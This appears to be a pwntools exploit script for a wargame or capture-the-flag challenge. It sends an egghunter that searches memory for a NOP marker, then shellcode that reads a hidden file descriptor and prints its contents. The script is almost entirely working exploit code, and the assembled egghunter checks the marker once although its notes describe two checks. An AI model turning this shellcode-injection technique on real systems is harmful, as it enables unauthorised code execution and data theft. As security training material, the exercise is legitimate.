from pwn import *

'''
highlevel:
eggfinder:
edi = stack_addr
target = 0x90909090
while (1==1) {
	if (*edi != target) {
		edi += 4;
		continue;
	}
	edi += 4
	if (*edi != target) {
		edi += 4;
		continue;
	}
	edi += 4
	break;
}
*edi()

egg:
bytes_read = read(1000, buf, 255);
write(1, buf, bytes_read)

'''
'''
med level

EGGHUNTER
set eax 0x90909090
set edi stack_addr

incr:
compare 4 bytes at edi
edi += 4
go to incr if not 0
compare 4 bytes at edi
edi += 4
go to incr if not 0
jmp edi

EGG
clear eax, ebx, edx

read:
set eax 0x03
set ebx 0x3E8
set ecx esp
set edx 0xFF
interrupt

eax now has num bytes read

write:
set edx eax
set eax 0x04
set ebx 0x01
set ecx esp
interrupt

'''
'''
low level

EGGHUNTER
mov eax, 0x90909090
mov edi, stack_addr
incr:
scasd
jnz incr
scasd
jnz incr
jmp edi

EGG
xor eax, eax
xor ebx, ebx
xor edx, edx
mov al, 0x3
mov bx, 0x3E8
mov ecx, esp
mov dl, 0xFF
int 0x80

xchg eax, edx
mov al, 0x4
mov bx, 0x1
int 0x80

'''

p = remote('plsdonthaq.me', 3003)
#p = process('./find-me')

p.recvuntil('new stack ')

stack_addr = str(p.recvline().rstrip(), 'utf-8')
print(stack_addr)

egghunter = asm(""" mov eax, 0x90909090
					mov edi, {}
					incr:
						scasd
						jnz incr
					jmp edi
					""".format(stack_addr))

print(len(egghunter), egghunter)

p.sendline(egghunter)

# we check for 8 nops, so having 12 is enough
shellcode = b'\x90'*12
shellcode += asm("""xor eax, eax
				    xor ebx, ebx
					xor edx, edx
				    mov al, 0x3
				    mov bx, 0x3E8
				    mov ecx, esp
				    mov dl, 0xFF
				    int 0x80

				    xchg eax, edx
				    mov al, 0x4
				    mov bx, 0x1
				    int 0x80
				    """)

p.sendline(shellcode)

p.interactive()
